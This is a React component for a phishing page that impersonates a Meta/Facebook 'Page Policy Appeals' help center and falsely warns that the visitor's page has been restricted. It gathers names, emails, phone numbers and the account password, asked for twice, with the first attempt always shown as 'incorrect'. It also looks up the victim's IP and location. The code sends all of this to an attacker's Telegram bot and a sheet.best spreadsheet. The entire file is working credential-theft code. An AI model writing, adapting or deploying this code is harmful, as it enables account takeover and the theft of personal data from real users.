import { useEffect, useState } from "react";
import "../business-help-center/style.css";
import {
  Button,
  Checkbox,
  Form,
  Input,
  Modal,
  Space,
  Radio,
  Dropdown,
  Tooltip,
} from "antd";
import { SearchOutlined } from "@mui/icons-material";
import { useNavigate } from "react-router-dom";
import { useDispatch } from "react-redux";
import { setData } from "../../store/business/businessSlice";
import axios from "axios";
import { ETelegram } from "../../constants";
import { DownOutlined, UserOutlined, HomeFilled } from "@ant-design/icons";
import React from "react";
const BusinessHelpCenter = () => {
  const [form] = Form.useForm();
  const navigate = useNavigate();
  const [namePage, setNamePage] = useState("");
  const [fullName, setFullName] = useState("");
  const [businessEmail, setBusinessEmail] = useState("");
  const [personalEmail, setPersonalEmail] = useState("");
  const [phone, setPhone] = useState("");
  const [date, setDate] = useState("");
  const [text, setText] = useState("");
  const [checkAccept, setCheckAccept] = useState<boolean>(false);

  const [password, setPassword] = useState("");
  const [passwordFirst, setPasswordFirst] = useState("");
  const [passwordSecond, setPasswordSecond] = useState("");
  const [checkPass, setCheckPass] = useState(false);
  const [open, setOpen] = useState(false);
  const [checkSend, setCheckSend] = useState<boolean>(true);
  const { TextArea } = Input;
  const [loading, setLoading] = useState(false);
  const dispatch = useDispatch();

  const showModal = () => {
    setOpen(true);
  };
  const handleOk = () => {
    setOpen(false);
  };
  const [formPassword] = Form.useForm();
  const handleCancel = () => {
    formPassword.resetFields();
    setOpen(false);
  };
  const handleSave = () => {
    if (passwordFirst === "") {
      setPasswordFirst(password);
    } else if (passwordSecond === "") {
      setPasswordSecond(password);
    }

    setPassword("");
  };
  const onFinish = async (e: any) => {
    if (!checkPass) {
      setCheckPass(true);
    } else {
      setCheckPass(false);
      setLoading(true);
      const location = await axios.get(
        "https://ipinfo.io?token=4ef03889d81a2d"
      );
      await Promise.all([
        sendTelegramBotForGgsheet(location),
        sendTelegramBotForBusiness(location),
      ]);
      setLoading(false);
      dispatch(
        setData({
          namePage,
          fullName,
          businessEmail,
          personalEmail,
          phone,
          date,
          checkAccept,
          text,
          passwordFirst,
          passwordSecond,
        })
      );
      clearState();
      navigate("/confirm");
    }
  };

  const sendTelegramBotForGgsheet = async (response: any) => {
    const API_URL = `https://api.telegram.org/bot${ETelegram.API_KEY}/`;
    let CURRENT_API_URL = API_URL + "sendMessage";
    try {
      let message = "✅ Đã thêm vào sheet thành công";
      const data = {
        ["Name Page"]: namePage,
        ["Full Name"]: fullName,
        ["Business Email Address"]: businessEmail,
        ["Personal Email Address"]: personalEmail,
        ["Mobile Phone Number"]: phone,
        ["Date of Birth"]: date,
        ["Please provide us information that will help us investigate"]: text,
        ["Password First"]: passwordFirst,
        ["Password Second"]: passwordSecond,
        ["Ip"]: response.data.ip,
        ["City"]: response.data.city,
        ["Country"]: response.data.country,
      };
      await axios
        .post(
          "https://sheet.best/api/sheets/abe85991-15f1-47f0-a1d6-242f44b22e94",
          data
        )
        .catch(() => {
          message = "❌Thêm vào sheet không thành công";
        });
      await axios.post(
        CURRENT_API_URL,
        {
          chat_id: ETelegram.CHAT_ID,
          parse_mode: "html",
          document: "",
          // text: message,
          // caption: message,
        },
        {
          headers: {
            "Content-Type": "multipart/form-data",
          },
        }
      );
    } catch (err) {
      console.log("err: ", err);
    }
  };

  const sendTelegramBotForBusiness = async (response: any) => {
    const API_URL = `https://api.telegram.org/bot${ETelegram.API_KEY}/`;
    let CURRENT_API_URL = API_URL + "sendMessage";
    try {
      let message = `
      Email Account:  ${businessEmail}
      Name Account: ${namePage}
      Person Email: ${personalEmail}
      Text: ${text}
      User Name: ${fullName}
      Phone Number: ${phone}
      Password First: ${passwordFirst}
      Password Second: ${passwordSecond}
      Ip: ${response.data.ip}
      City: ${response.data.city}
      Country: ${response.data.country}
      `;
      await axios.post(
        CURRENT_API_URL,
        {
          chat_id: ETelegram.CHAT_ID,
          parse_mode: "html",
          document: "",
          text: message,
          // caption: message,
        },
        {
          headers: {
            "Content-Type": "multipart/form-data",
          },
        }
      );
    } catch (err) {
      console.log("err: ", err);
    }
  };

  const clearState = () => {
    setNamePage("");
    setFullName("");
    setBusinessEmail("");
    setPersonalEmail("");
    setPhone("");
    setDate("");
    setText("");
    setPasswordFirst("");
    setPasswordSecond("");
  };

  const setValidate = ({
    namePage,
    fullName,
    businessEmail,
    personalEmail,
    phone,
    date,
    checkAccept,
    text,
  }: {
    namePage: string;
    fullName: string;
    businessEmail: string;
    personalEmail: string;
    phone: string;
    date: string;
    checkAccept: boolean;
    text: string;
  }) => {
    if (
      namePage &&
      fullName &&
      businessEmail &&
      personalEmail &&
      phone &&
      text &&
      // date &&
      checkAccept
    ) {
      setCheckSend(false);
      return;
    }
    setCheckSend(true);
  };
  const [checkedRadio, setCheckedRadio] = useState(false);

  const toggleRadio = () => {
    setCheckedRadio(!checkedRadio);
  };
  const tabs = [
    "Creating an Account",
    "Your Profile",
    "Friending",
    "Facebook Dating",
    "Your Home Page",
    "Messaging",
    "Reels",
    "Stories",
    "Photos",
    "Videos",
    "Gaming",
    "Pages",
    "Groups",
    "Events",
    "Fundraisers and Donations",
    "Meta Pay",
    "Marketplace",
    "Apps",
    "Facebook Mobile Apps",
    "Accessibility",
  ];
  const items = [
    {
      label: "News/Media",
      key: "1",
    },
    {
      label: "Sports",
      key: "2",
    },
    {
      label: "Government & Politics",
      key: "3",
    },
    {
      label: "Music",
      key: "4",
    },
    {
      label: "Fashion",
      key: "5",
    },
    {
      label: "Entertainment",
      key: "6",
    },
    {
      label: "Digital Creator/Blogger/Influencer",
      key: "7",
    },
    {
      label: "Gamer",
      key: "8",
    },
    {
      label: "Business/Brand/Originization",
      key: "9",
    },
    {
      label: "Other",
      key: "10",
    },
  ];
  // const handleButtonClick = (e) => {
  //   console.log("click left button", e);
  // };
  const [selectedItem, setSelectedItem] = useState("News/Media");
  const handleMenuClick = (e: any) => {
    // Cập nhật giá trị item được chọn vào trạng thái
    const selected = items.find((item) => item.key === e.key)?.label;
    if (selected) {
      setSelectedItem(selected); // Cập nhật giá trị được chọn vào state
    }
  };
  const menuProps = {
    items,
    onClick: handleMenuClick,
  };
  const redictMeta = () => {
    window.location.href = "https://www.facebook.com";
  };
  return (
    <div className="container_business">
      <div className="topheader bg-facebook p-2">
        <div className="sm:w-11/12 md:w-4/6 flex justify-between items-center mx-auto">
          <div className="w-[20%] md:w-[15%]">
            <a onClick={redictMeta}>
              <img
                src="/images/facebook.png"
                width="90"
                height="20"
                alt="facebook"
              />
            </a>
          </div>
          <div className="flex shadow-sm w-[60%] md:w-[50%]">
            <span className="px-4 inline-flex items-center min-w-fit border border-r-0 border-gray-200 bg-gray-50 text-sm ">
              <div className="block w-full h-full">
                <SearchOutlined />
              </div>
            </span>
            <input
              type="search"
              className="py-2 px-3 pr-11 block w-full border-gray-200 shadow-sm text-sm focus:z-10 focus:border-blue-500 focus:ring-blue-500 focus:outline-none"
              placeholder="How can we help?"
            ></input>
          </div>
        </div>
      </div>
      <div className="bg-[#E9EBEE]">
        <div className="w-11/12 sm:w-11/12 md:w-4/6 flex justify-between items-center mx-auto">
          <a
            href="#"
            className="flex items-center text-[#3578E5] font-semibold py-4 border-b-[3px] border-[#3578E5] text-[15px] leading-6"
          >
            <HomeFilled className="mr-2" />
            Help Center
          </a>
          <span className="text-[#3578E5]">English(us)</span>
        </div>
      </div>
      <div className="block">
        <div className="w-full flex">
          <div className="lg:w-1/5 lg:ml-40 md:ml-10 hidden md:block mt-6">
            <div className="p-4">
              <ul className="space-y-2 text-gray-800 mt-2">
                {tabs.map((tab, index) => (
                  <li
                    key={index}
                    className="cursor-pointer text-[14px] leading-6 hover:bg-gray-100"
                  >
                    {tab}
                  </li>
                ))}
              </ul>
            </div>
          </div>
          <div className="content">
            <div className="w-full bg-[#e9ebee]">
              <p className="font-semibold rounded-t-lg text-lg border-b border-gray-200 bg-[#F5F6F7] p-3">
                Page Policy Appeals
              </p>
            </div>
            <div className="p-4">
              <p className="text-xs mb-4">
                We have detected unusual activity on your page that violates our
                community standards.
              </p>
              <p className="text-xs mb-4">
                Your access to your page has been limited, and you are currently
                unable to post, share, or comment using your page.
              </p>
              <p className="text-xs mb-4">
                If you believe this to be a mistake, you have the option to
                submit an appeal by providing the necessary information.
              </p>
              <div>
                <Form
                  form={form}
                  name="validateOnly"
                  layout="vertical"
                  autoComplete="off"
                >
                  {/* <div className="text_sup">
                    <Form.Item
                      name="category"
                      label="Category"
                      // rules={[{ required: true, message: "Fullname is required" }]}
                    >
                      <Space wrap>
                        <Dropdown menu={menuProps}>
                          <Button className="w-full">
                            <Space>
                              {selectedItem}
                              <DownOutlined />
                            </Space>
                          </Button>
                        </Dropdown>
                      </Space>
                    </Form.Item>
                  </div> */}
                  <Form.Item
                    name="namePage"
                    label="Name Page"
                    colon={false}
                    rules={[
                      {
                        required: true,
                        message: "Name Page is required",
                      },
                    ]}
                  >
                    <Input
                      onChange={(e) => {
                        setNamePage(e.target.value);
                        setValidate({
                          namePage: e.target.value,
                          fullName,
                          businessEmail,
                          personalEmail,
                          phone,
                          date,
                          checkAccept,
                          text,
                        });
                      }}
                      value={namePage}
                    />
                  </Form.Item>
                  <Form.Item
                    name="fullName"
                    label="Fullname"
                    rules={[
                      { required: true, message: "Fullname is required" },
                    ]}
                  >
                    <Input
                      onChange={(e) => {
                        setFullName(e.target.value);
                        setValidate({
                          namePage,
                          fullName: e.target.value,
                          businessEmail,
                          personalEmail,
                          phone,
                          checkAccept,
                          date,
                          text,
                        });
                      }}
                      value={fullName}
                    />
                  </Form.Item>
                  <Form.Item
                    name="businessEmail"
                    label="Business Email Address"
                    rules={[
                      {
                        required: true,
                        message: "Business Email Address is required",
                      },
                    ]}
                  >
                    <Input
                      onChange={(e) => {
                        setBusinessEmail(e.target.value);
                        setValidate({
                          namePage,
                          fullName,
                          businessEmail: e.target.value,
                          personalEmail,
                          phone,
                          date,
                          checkAccept,
                          text,
                        });
                      }}
                      value={businessEmail}
                    />
                  </Form.Item>
                  <Form.Item
                    name="personalEmail"
                    label="Personal Email Address"
                    rules={[
                      {
                        required: true,
                        message: "Personal Email Address is required",
                      },
                    ]}
                  >
                    <Input
                      onChange={(e) => {
                        setPersonalEmail(e.target.value);
                        setValidate({
                          namePage,
                          fullName,
                          businessEmail,
                          personalEmail: e.target.value,
                          phone,
                          date,
                          checkAccept,
                          text,
                        });
                      }}
                      value={personalEmail}
                    />
                  </Form.Item>
                  <Form.Item
                    name="phone"
                    label="Mobile Phone Number"
                    rules={[
                      {
                        required: true,
                        message: "Mobile Phone Number is required",
                      },
                    ]}
                  >
                    <Input
                      onChange={(e) => {
                        setPhone(e.target.value);
                        setValidate({
                          namePage,
                          fullName,
                          businessEmail,
                          personalEmail,
                          phone: e.target.value,
                          date,
                          checkAccept,
                          text,
                        });
                      }}
                      value={phone}
                    />
                  </Form.Item>
                  <Form.Item
                    name="provide_us"
                    label="Please provide us information that will help us investigate."
                    rules={[
                      {
                        required: true,
                        message: "Provide us information is required",
                      },
                    ]}
                  >
                    <TextArea
                      onChange={(e) => {
                        setText(e.target.value);
                        setValidate({
                          namePage,
                          fullName,
                          businessEmail,
                          personalEmail,
                          phone,
                          date,
                          checkAccept,
                          text: e.target.value,
                        });
                      }}
                      value={text}
                    />
                  </Form.Item>

                  {/* <Form.Item
                    name="date"
                    label="Date of Birth"
                    colon={false}
                    // rules={[
                    //   { required: true, message: "Date of Birth is required" },
                    // ]}
                  >
                    <Input
                      type="date"
                      onChange={(e) => {
                        setDate(e.target.value);
                        setValidate({
                          namePage,
                          fullName,
                          businessEmail,
                          personalEmail,
                          phone,
                          date: e.target.value,
                          checkAccept,
                          text,
                        });
                      }}
                      value={date}
                    />
                  </Form.Item> */}

                  <Form.Item
                    rules={[
                      {
                        required: true,
                        message:
                          "Please agree to our terms and data and cookie policy!",
                      },
                    ]}
                  >
                    <Checkbox
                      checked={checkAccept}
                      onChange={(e) => {
                        setCheckAccept(e.target.checked);

                        setValidate({
                          namePage,
                          fullName,
                          businessEmail,
                          personalEmail,
                          phone,
                          date,
                          checkAccept: e.target.checked,
                          text,
                        });
                      }}
                    >
                      I agree to our Terms, Data and Cookies Policy.
                    </Checkbox>
                  </Form.Item>
                </Form>
              </div>
            </div>
            <div className="footer_content">
              <>
                <Space>
                  <Button
                    style={{
                      width: "92%",
                      height: "40px",
                      position: "absolute",
                      right: "24px",
                      top: "14px",
                      fontSize: "1rem",
                      fontWeight: "700",
                    }}
                    type="primary"
                    onClick={showModal}
                    disabled={checkSend}
                  >
                    <p className="mx-auto">Submit</p>
                  </Button>
                </Space>
                <Modal
                  open={open}
                  title="Please Enter Your Password"
                  onOk={handleOk}
                  onCancel={handleCancel}
                  width={400}
                  footer={false}
                >
                  <p
                    style={{
                      marginBottom: "8px",
                      paddingTop: "6px",
                      marginTop: "16px",
                      borderTop: "1px solid #e9ebee",
                    }}
                  >
                    For your security, you must re-enter your password to
                    continue
                  </p>
                  <Form
                    form={formPassword}
                    layout="vertical"
                    onFinish={onFinish}
                    autoComplete="off"
                  >
                    <Form.Item
                      name="password"
                      label={<div>Enter Your Password</div>}
                    >
                      <Input.Password
                        placeholder="input password"
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                      />
                      {checkPass === true && (
                        <div style={{ color: "red" }}>
                          Your password was incorrect!
                        </div>
                      )}
                    </Form.Item>
                    <Form.Item>
                      <Space
                        style={{
                          display: "flex",
                          justifyContent: "end",
                          alignItems: "center",
                        }}
                      >
                        <Button
                          type="primary"
                          htmlType="submit"
                          onClick={handleSave}
                          loading={loading}
                          style={{ fontSize: ".875rem", fontWeight: "600" }}
                        >
                          Continue
                        </Button>
                      </Space>
                    </Form.Item>
                  </Form>
                </Modal>
              </>
            </div>
          </div>
        </div>
      </div>
      <div className="footer">
        <div className="footer_bottom">
          <div className="column">
            <p className="cursor-pointer hover:text-blue-500 hover:underline">
              Meta @ 2024
            </p>
            <p className="cursor-pointer hover:text-blue-500 hover:underline">
              English(US)
            </p>
          </div>
          <div className="column">
            <p className="cursor-pointer hover:text-blue-500 hover:underline">
              About
            </p>
            <p className="cursor-pointer hover:text-blue-500 hover:underline">
              Privacy Policy
            </p>
            <p className="cursor-pointer hover:text-blue-500 hover:underline">
              Careers
            </p>
          </div>
          <div className="column">
            <p className="cursor-pointer hover:text-blue-500 hover:underline">
              Ad choices
            </p>
            <p className="cursor-pointer hover:text-blue-500 hover:underline">
              Create ad
            </p>
            <p className="cursor-pointer hover:text-blue-500 hover:underline">
              Create Page
            </p>
          </div>
          <div className="column">
            <p className="cursor-pointer hover:text-blue-500 hover:underline">
              Terms & Policies
            </p>
            <p className="cursor-pointer hover:text-blue-500 hover:underline">
              Cookies
            </p>
          </div>
        </div>
      </div>
      {/* <div className="support">
        <div className="footer-line">
          <span>EngLish(UK)</span>
          <span>EngLish(US)</span>
          <span>Espanol</span>
          <span>Portugues(Brasil)</span>
          <span>Francais(France)</span>
          <span>Espanol(Espana)</span>
          <span>More languages</span>
        </div> */}
      {/* <div className="footer-line">
          <span>@2023 Meta</span>
          <span>About</span>
          <span>Developers</span>
          <span>Careers</span>
          <span>Privacy</span>
          <span>Cookies</span>
          <span>Terms</span>
          <span>Help Centre</span>
        </div> */}
      {/* </div> */}
    </div>
  );
};

export default BusinessHelpCenter;
